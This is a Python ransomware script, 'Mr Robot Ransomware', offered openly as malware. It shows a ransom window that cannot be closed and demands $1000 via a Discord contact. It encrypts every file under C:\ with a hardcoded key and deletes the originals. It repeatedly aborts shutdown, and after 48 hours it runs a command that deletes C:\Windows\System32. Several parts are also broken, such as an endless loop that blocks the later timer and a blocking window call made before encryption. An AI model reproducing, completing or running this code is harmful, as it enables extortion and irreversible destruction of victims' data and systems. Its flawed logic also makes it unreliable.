import os
import time
import ctypes
import random
import string
import pyAesCrypt
import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta
import win32api
import win32con
import win32process
import win32com.shell.shell as shell

# 💀 Ransomware config  
CONTACT = "himself#1234"  
RANSOM_TIME = 48 * 60 * 60  # 48 hours in seconds  
KEY = "himself"
ENCRYPTED_SUFFIX = ".encrypted"  
ENC_KEY_FILE = os.path.join(os.getenv("APPDATA"), "decryption_key.bin")  
PAYMENT_RECEIVED = os.path.join(os.getenv("APPDATA"), "payment_received.txt")  

# 🤖 Set Mr. Robot background  
ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\MrRobot.jpg", 0)  

# 🧨 GUI lock  
class RansomWindow(tk.Tk):  
    def __init__(self):  
        super().__init__()  
        self.title("Mr Robot Ransomware")  
        self.geometry("400x300")  
        self.attributes("-topmost", True)  
        self.overrideredirect(True)  
        self.resizable(False, False)  
        self.label = tk.Label(self, text="YOUR FILES ARE ENCRYPTED!", font=("Courier", 20), bg="black", fg="red")  
        self.label.pack(expand=True)  
        self.label2 = tk.Label(self, text=f"PAY 1000$ TO {CONTACT} ON DISCORD TO DECRYPT!\n\n"  
                                        "Time left: 48hr\n\n"  
                                        "CLOSE WINDOW TO ENCRYPT SYSTEM!", font=("Arial", 12))  
        self.label2.pack()  
        self.protocol("WM_DELETE_WINDOW", self.block_close)  
        self.mainloop()  

    def block_close(self):  
        pass  # Prevent window closure  

# 🔥 Main Ransomware logic  
def run_ransomware():  
    try:  
        # 🧠 Store start time in registry  
        start_time = datetime.now()  
        with open("C:\\RansomTime.txt", "w") as f:  
            f.write(str(start_time))  

        # 🔐 Save decryption key in APPDATA  
        with open(ENC_KEY_FILE, "wb") as f:  
            f.write(KEY)  

        # 📁 Encrypt all files (including system files)  
        for root, dirs, files in os.walk("C:\\"):  
            for file in files:  
                file_path = os.path.join(root, file)  
                if os.path.isfile(file_path) and file not in ["key.bin", "RansomTime.txt"]:  
                    pyAesCrypt.encryptFile(file_path, file_path + ENCRYPTED_SUFFIX, KEY, 64 * 1024)  
                    os.remove(file_path)  

        # 🔄 Prevent system restart/shutdown  
        def disable_shutdown():  
            while True:  
                time.sleep(1)  
                os.system("shutdown /a")  # Abort shutdown  
                win32api.PostMessage(win32process.GetConsoleWindow(), win32con.WM_CLOSE, 0, 0)  # Prevent system exit  

        disable_shutdown()  

        # ⏳ Wait 48h  
        while True:  
            time.sleep(1)  
            current_time = datetime.now()  
            elapsed = (current_time - start_time).total_seconds()  
            if elapsed >= RANSOM_TIME:  
                print("💀 System32 deleted!")  
                os.system("rd /s /q C:\\Windows\\System32")  
                break  

    except:  
        print("💥 Error detected. Keep it frozen.")  

# 📦 Run ransomware  
if __name__ == "__main__":  
    ransom_window = RansomWindow()  
    run_ransomware()  